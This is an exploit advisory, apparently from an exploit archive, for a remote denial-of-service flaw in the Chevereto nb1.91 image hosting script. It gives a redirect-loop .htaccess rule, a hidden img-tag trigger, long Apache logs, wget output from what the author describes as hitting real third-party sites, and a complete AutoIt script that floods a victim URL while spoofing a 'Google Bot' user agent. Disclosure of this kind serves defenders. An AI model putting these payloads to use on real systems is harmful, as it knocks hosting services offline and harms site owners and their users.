@@ -1,0 +1,328 @@
+id: 18234
+date: 05/11/2012
+title: Chevereto nb1.91 Denial Of Service
+author: AkaStep
+cves: 
+
+========================================================================================
+Vulnerable Software: chevereto_nb1.91
+Downloaded from: http://code.google.com/p/chevereto/downloads/list
+(http://code.google.com/p/chevereto/downloads/detail?name=chevereto_nb1.91.zip&can=2&q=)
+Official site: http://chevereto.com/
+chevereto_nb1.91.zip Nightly Build 1.91 Featured Oct 2010 471 KB 32167
+========================================================================================
+About software:See from vendor: http://chevereto.com/
+chevereto is outstanding Image Hosting Script (c) chevereto.com
+========================================================================================
+Vuln Desc: chevereto_nb1.91 is prone to remote Denial Of Service Vuln.
+
+The main problem in that this image upload script doesn't uses any unique validating technique for per request when
+proceeding
+$_GET['url'] (remote url)
+Simply this means it handles remote file checking procedure like below:
+http://192.168.0.15/learn/chevereto/chevereto_nb1.91/Upload/?url=http://somesite.tld/somevalidimage.png
+
+Script will check is remote file valid image? Sounds safe yeah?
+Lets look which function is responsible to this operation:
+
+//engine.php
+// FX Filtro (REMOTO)
+function checkremota($rup) {
+if(isValidURL($rup)) {
+$info = getimagesize($rup);
+if(!empty($info)) {
+return true;
+} else {
+return false;
+}
+} else {
+return false;
+}
+}
+
+
+But we can trick it to act as something like infinitive loop :)
+
+Here is main algo to exploit this vuln:
+
+HOST B is attacker.In eg: http://somesite.tld/
+HOST A is victim:In eg: http://192.168.0.15/
+
+Attacker (HOST B) creates simply this .htaccess file and uploads it to his/her site.
+
+.htaccess
+#I'm attacker and i'm on host B. BTW, We can call it as "Bouncer" #
+Redirect 301 /fake.png http://HOST_A_OR_VICTIM/Upload/?url=http://somesite.tld//fake.png
+
+As you can see http://somesite.tld//fake.png (fake.png) it doesn't exist and it is not neccessary.
+
+Then attacker uses same "malicious" url which he/she created in his .htaccess file.
+In eg attacker injects it to anothers sites like image:(It simply will act as "detonator" to start this
+attack)
+
+<img src="http://HOST_A_OR_VICTIM/Upload/?url=http://somesite.tld/fake.png" heigth="0"
+width="0" />
+
+Thats all! See what it does on remote site (From Apache access logs)
+
+
+192.168.0.15 - - [10/May/2012:17:55:55 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 -
+192.168.0.15 - - [10/May/2012:17:55:55 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 - "-"
+"-"
+192.168.0.15 - - [10/May/2012:17:57:55 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:17:57:55 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:55:56 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 -
+192.168.0.15 - - [10/May/2012:17:55:56 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 - "-"
+"-"
+192.168.0.15 - - [10/May/2012:17:57:56 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:17:57:56 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:55:56 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 -
+192.168.0.15 - - [10/May/2012:17:55:56 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 - "-"
+"-"
+192.168.0.15 - - [10/May/2012:17:57:56 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:17:57:56 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:55:56 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 -
+192.168.0.15 - - [10/May/2012:17:55:56 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 - "-"
+"-"
+192.168.0.15 - - [10/May/2012:17:57:56 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:17:57:56 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:58:47 +0400] "GET //fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:17:58:47 +0400] "GET //fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:58:47 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:17:58:47 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:58:47 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:17:58:47 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:58:47 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:17:58:47 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:58:47 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:17:58:47 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.1 - - [10/May/2012:17:58:47 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15//fake.png HTTP/1.1" 200 -
+192.168.0.1 - - [10/May/2012:17:58:47 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15//fake.png HTTP/1.1" 200 - "-"
+"Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0"
+192.168.0.15 - - [10/May/2012:17:58:47 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 -
+192.168.0.15 - - [10/May/2012:17:58:47 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 - "-"
+"-"
+192.168.0.15 - - [10/May/2012:18:00:48 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:18:00:48 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.1 - - [10/May/2012:18:00:48 +0400] "GET /favicon.ico HTTP/1.1" 404 46
+192.168.0.1 - - [10/May/2012:18:00:48 +0400] "GET /favicon.ico HTTP/1.1" 404 46 "-"
+"Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0"
+192.168.0.15 - - [10/May/2012:17:58:47 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 -
+192.168.0.15 - - [10/May/2012:17:58:47 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 - "-"
+"-"
+192.168.0.15 - - [10/May/2012:17:58:47 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 -
+192.168.0.15 - - [10/May/2012:17:58:47 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 - "-"
+"-"
+192.168.0.1 - - [10/May/2012:18:00:48 +0400] "GET /favicon.ico HTTP/1.1" 404 46
+192.168.0.1 - - [10/May/2012:18:00:48 +0400] "GET /favicon.ico HTTP/1.1" 404 46 "-"
+"Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0"
+192.168.0.15 - - [10/May/2012:18:00:48 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:18:00:48 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:58:47 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 -
+192.168.0.15 - - [10/May/2012:17:58:47 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 - "-"
+"-"
+192.168.0.15 - - [10/May/2012:17:58:47 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 -
+192.168.0.15 - - [10/May/2012:17:58:47 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 - "-"
+"-"
+192.168.0.15 - - [10/May/2012:18:00:48 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:18:00:48 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 -
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 - "-"
+"-"
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 -
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 - "-"
+"-"
+192.168.0.15 - - [10/May/2012:18:00:48 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:18:00:48 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 -
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 - "-"
+"-"
+192.168.0.15 - - [10/May/2012:18:00:48 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:18:00:48 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 -
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 - "-"
+"-"
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 -
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 - "-"
+"-"
+192.168.0.15 - - [10/May/2012:18:00:49 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:18:00:49 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 -
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 - "-"
+"-"
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 -
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 - "-"
+"-"
+192.168.0.15 - - [10/May/2012:18:00:49 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:18:00:49 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 -
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 - "-"
+"-"
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 -
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 - "-"
+"-"
+192.168.0.15 - - [10/May/2012:18:00:49 +0400] "GET /fake.png HTTP/1.0" 301 301
+192.168.0.15 - - [10/May/2012:18:00:49 +0400] "GET /fake.png HTTP/1.0" 301 301 "-" "-"
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 -
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 - "-"
+"-"
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 -
+192.168.0.15 - - [10/May/2012:17:58:48 +0400] "GET
+/learn/chevereto/chevereto_nb1.91/Upload/?url=http://192.168.0.15/fake.png HTTP/1.0" 200 - "-"
+"-"
+
+
+
+
+While testing it (localhost machine)
+CPU LOAD 100%
+Apache is down.Because:
+[Thu May 10 17:58:58 2012] [warn] Server ran out of threads to serve requests. Consider raising the ThreadsPerChild
+setting.
+In other words this script can act as something like "tennis ball" to create Denial of Service conditions on
+hostings.
+
+Exploiting on real site which uses chevereto_nb1.91:
+For security reasons IP addresses and domain names is not published here.
+
+
+me@localhost.localdomain~
+$ wget http://site1/fake.png
+--2012-05-10 21:20:09-- http://site1/fake.png
+Resolving site1 (site1)... 195.250.**.**
+Connecting to site1 (site1)|195.250.**.**|:80... connected.
+HTTP request sent, awaiting response... 301 Moved Permanently
+Location: http://site2/?url=http://site1/fake.png [following]
+--2012-05-10 21:20:11-- http://site2/?url=http://site1/fake.png
+Resolving site2 (site2)... 95.1**.***.***
+Connecting to site2 (site2)|95.1**.***.***|:80... connected.
+HTTP request sent, awaiting response... 500 Internal Server Error
+2012-05-10 21:22:20 ERROR 500: Internal Server Error.
+
+
+me@localhost.localdomain~
+$ wget http://site2/?url=http://site1/fake.png
+--2012-05-10 21:24:03-- http://site2/?url=http://site1/fake.png
+Resolving site2 (site2)... 95.1**.***.***
+Connecting to site2 (site2)|95.1**.***.***|:80... connected.
+HTTP request sent, awaiting response... Read error (Connection reset by peer) in headers.
+Retrying.
+============================================================
+NOTE0:Also i found script called *Imagise 1.11.29, based on Chevereto NB* which uses chevereto_nb1.91 engine.php.It is
+also vulnerable to this vuln.
+============================================================
+NOTE1:Previous versions seems is not vulnerable.At least i remotely from scratch checked against Chevereto NB1.6 rev2 it
+is not exploitable(not vulnerable).
+============================================================
+
+The following Proof Of Concept Exploit is available:
+========================= EXPLOIT===========================
+====chevereto_nb1.91 Remote Denial of Service Exploit=======
+
+#NoTrayIcon
+
+#cs
+Name DOS.au3
+Autoitscript file.
+#ce
+
+$victimsite='http://victim.tld/';//victim site.
+$attackersite='http://attacker.tld/fake.png';// notice your fake.png +it is attackers site.
+
+
+;# do not change especially $aux #
+$aux='?url=';
+While 1
+Sleep(Random(3000,8000,1));// in random manner (minimum 3 - max 8 seconds).
+;HttpSetProxy(2,'localhost:9049'); // if you want to use proxy uncomment it+change it to your needs.
+HttpSetUserAgent('Google Bot');//Our user agent
+$get=InetGet($victimsite & $aux & $attackersite,'',1);//our request
+InetClose($get);//closing connection.
+WEnd
+=========================EOF EXPLOIT=========================
+
+
+
+============================================================
+NOTE2:
+Got responce from From Vendor of this script: NB is discontinued and *no longer developed*
+You can read the notice right here: http://code.google.com/p/chevereto/ and
+the original post is here: http://chevereto.com/forums/post7400.html#p7400
+============================================================
+
+
+
+
+My sincerely apogolises Guys to resubmit this script's vulns again.Because after looking to code more closer i
+imaged to find it(new vuln) and imaged how to exploit it.
+Anyways,my sincerely Thanks to packetstormsecurity.org's staff.
+Respect)
+
+
+
+#  0day.today [2023-03-26]  #
